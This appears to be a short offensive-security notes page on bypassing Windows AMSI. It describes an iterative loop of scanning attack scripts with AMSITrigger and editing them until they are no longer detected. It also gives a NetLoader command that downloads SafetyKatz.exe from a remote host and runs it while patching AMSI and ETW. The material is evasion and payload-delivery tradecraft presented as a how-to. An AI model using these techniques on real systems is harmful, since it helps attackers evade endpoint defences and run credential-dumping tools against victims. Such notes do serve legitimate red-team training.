# üî• AMSI Bypass

### Bypass Defences On-Memory

### Bypass Defences On-Disk

[AMSITrigger](https://github.com/RythmStick/AMSITrigger)

{% code overflow="wrap" %}
```powershell
AmsiTrigger_x64.exe -i C: AD Tools Invoke PowerShellTcp_Detected.ps1 DefenderCheck.exe PowerUp.ps1
```
{% endcode %}

Steps to avoid signature-based detection are pretty simple:&#x20;

1\) Scan using AMSITrigger&#x20;

2\) Modify the detected code snippet&#x20;

3\) Rescan using AMSITrigger&#x20;

4\) Repeat steps 2 & 3 till we get a result as ‚ÄúAMSI\_RESULT\_NOT\_DETECTED‚Äù or ‚ÄúBLANK"

### Payload Delivery

{% embed url="https://github.com/Flangvik/NetLoader" %}

It can be used to load binary from file path or URL and patch AMSI & ETW while executing.

```
C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
```

**Summary of Bypassing Defence Mechanisms**

To evade on-memory and on-disk defences, the process involves iteratively modifying and scanning scripts or executables to evade signature-based detection tools like AMSITrigger. The goal is to continue the cycle of modification and rescanning until tools like AMSITrigger no longer detect the code, indicating a successful bypass.

* **On-Memory Bypass Routine:**
  1. Execute AMSITrigger to identify detectable code.
  2. Alter the code flagged by AMSITrigger.
  3. Rescan with AMSITrigger post-modification.
  4. Repeat until "AMSI\_RESULT\_NOT\_DETECTED" appears.
*   **Delivery of Payload:**

    A loader can be utilized for delivering a payload, which involves fetching and executing a binary from either a local path or a remote URL. Consequently, the binary can patch both AMSI and ETW, helping the payload to avoid detection during execution. A typical command for this operation follows the format:

    ```
    Loader.exe -path <binary_source>
    ```
